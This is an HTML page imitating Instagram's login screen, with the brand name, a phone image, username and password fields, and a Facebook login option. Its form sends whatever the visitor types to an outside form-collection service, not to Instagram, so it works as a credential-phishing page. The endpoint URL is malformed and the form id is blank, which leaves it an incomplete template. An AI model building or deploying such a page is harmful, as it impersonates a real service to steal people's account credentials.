<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="phone-container">
            <img src="pn.jpeg" height="550px" alt="Instagram phone" class="phone-image">
        </div>
        <div class="form-container">
            <div class="form-box">
                <h1 class="instagram-logo">Instagram</h1>
                <form action="https;//formspree.io/f/">
                    <input type="text" name="username" placeholder="Phone number, username, or email">
                    <input type="password" name="password" placeholder="Password">
                    <button type="submit">Log In</button>
                </form>
                <div class="divider">
                    <div class="line"></div>
                    <div class="or">OR</div>
                    <div class="line"></div>
                </div>
                <div class="social-login">
                    <!-- <img src="fb-logo.png" alt="Facebook logo" class="fb-logo"> -->
                    <span>Log in with Facebook</span>
                </div>
                <a href="#" class="forgot-password">Forgot password?</a>
            </div>
            <div class="signup-box">
                <span>Don't have an account? <a href="#">Sign up</a></span>
            </div>
            <div class="get-app">
                <span>Get the app.</span>
                <div class="app-links">
                    <!-- <img src="appstore.png" alt="App Store"> -->
                    <!-- <img src="playstore.png" alt="Google Play"> -->
                </div>
            </div>
        </div>
    </div>
</body>
</html>
